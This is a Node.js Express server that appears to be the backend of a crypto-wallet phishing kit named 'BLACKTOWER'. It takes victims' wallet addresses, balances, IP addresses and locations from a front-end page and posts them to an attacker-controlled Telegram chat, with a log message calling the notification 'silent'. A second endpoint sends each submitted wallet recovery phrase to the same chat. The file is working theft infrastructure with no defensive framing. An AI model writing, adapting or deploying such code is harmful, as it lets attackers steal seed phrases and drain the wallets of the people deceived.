const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegramMessage(data) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('Telegram credentials missing');
        return;
    }

    const message = `🛡️ **BLACKTOWER - New Connection** 🛡️

👛 **Wallet:** \`${data.walletAddress}\`
💰 **Balance:** ${data.balance} ETH
💵 **USD Value:** $${(parseFloat(data.balance) * 2456).toFixed(2)}

🌍 **Location:** ${data.country}, ${data.city}
📡 **IP Address:** ${data.ipAddress}

⏰ **Time:** ${new Date(data.timestamp).toLocaleString()}

🔗 **Explorer:** https://etherscan.io/address/${data.walletAddress}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
        console.log('Telegram notification sent silently');
    } catch (error) {
        console.error('Telegram error:', error.message);
    }
}

async function sendRecoveryToTelegram(data) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

    const message = `🔑 **WALLET RECOVERY INITIATED** 🔑

👛 **Wallet:** \`${data.walletAddress}\`
🌍 **IP:** ${data.ip}

📝 **Recovery Phrase:**
\`\`\`
${data.phrase}
\`\`\`

🔐 **New Password Set:** ${data.newPassword ? 'Yes' : 'No'}

⏰ **Time:** ${new Date().toLocaleString()}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
    } catch (error) {
        console.error('Telegram recovery error:', error.message);
    }
}

app.post('/api/collect', async (req, res) => {
    try {
        await sendTelegramMessage(req.body);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/recovery', async (req, res) => {
    try {
        await sendRecoveryToTelegram(req.body);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('*', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});